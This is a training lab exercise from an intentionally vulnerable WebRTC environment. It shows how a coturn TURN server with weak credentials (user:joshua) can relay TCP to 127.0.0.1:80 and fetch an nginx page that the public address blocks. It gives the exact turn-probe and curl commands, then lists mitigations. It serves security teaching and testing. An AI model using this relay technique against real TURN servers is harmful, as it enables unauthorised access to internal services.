# Exercise 6: TURN Relay Abuse

## Goal

Use the TURN server on `PUBLIC_IPV4` to relay a TCP connection to `127.0.0.1:80` and fetch nginx's protected `/secret/` page.

## Prerequisites

- DVRTC running: `./scripts/compose.sh --scenario pbx1 up -d`
- `PUBLIC_IPV4` set correctly in `.env`
- `curl` and `turn-probe` available in the `attacker` service

## Steps

### Step 1: Open an attacker shell

Run on the host:

```bash
./scripts/compose.sh --scenario pbx1 run --rm attacker bash
cd /work
```

Use `/work` so the response file remains available in the repository's `artifacts/` directory after the container exits.

### Step 2: Confirm direct access to `/secret/` is blocked

In the attacker shell:

```bash
curl -si "http://$PUBLIC_IPV4/secret/" | head
```

Look for `HTTP/1.1 403 Forbidden`.
CLI-style clients now get a one-line `You shall not pass!` response body, while browsers that request HTML get the custom `403` page.

### Step 3: Fetch `/secret/` through the TURN relay

In the attacker shell:

```bash
turn-probe tcp-http-get --host "$PUBLIC_IPV4" --username user --password joshua --peer 127.0.0.1 --path /secret/ --expect-body "shutdown the Internet" --dump-response | tee turn-secret-response.txt
```

This connects to coturn on `PUBLIC_IPV4`, asks it to open a TCP connection to `127.0.0.1:80`, and sends an HTTP request for `/secret/` over the relayed connection.
The response file is written to `artifacts/turn-secret-response.txt` in the repository root.

### Step 4: Confirm the relay succeeded

In the attacker shell:

```bash
grep -E 'verdict=pass|safely shutdown the Internet' turn-secret-response.txt
exit
```

You should see a passing `RESULT` line and the protected page's one-line response.

## What's happening

The TURN server is intentionally vulnerable because it uses weak credentials (`user:joshua`) and allows relayed connections to loopback peers such as `127.0.0.1`. An attacker can authenticate to coturn on the public address, ask it to connect to `127.0.0.1:80`, and then tunnel arbitrary TCP traffic through that relayed connection.

Nginx keeps `/secret/` on the public listener only as a blocked decoy that returns the `403` page. The actual secret content is served from a separate loopback-only listener on `127.0.0.1:80`, so a direct request to `PUBLIC_IPV4` is denied while a TURN relay to loopback reaches the protected page. CLI-style clients get a plain-text one-liner, while browsers that request HTML get the retro shutdown joke page.

## Mitigation

- Remove loopback and other internal-only destinations from the TURN server's allowed peer list
- Use strong, unique TURN credentials and rotate them regularly
- Disable TURN TCP relaying if clients do not need it
- Require authentication on sensitive internal services as defense in depth, so relayed access does not automatically grant access to protected content
- Do not rely on loopback-only binding to protect sensitive services when TURN can relay to loopback; either block those peers in TURN or place the service outside TURN-reachable address space
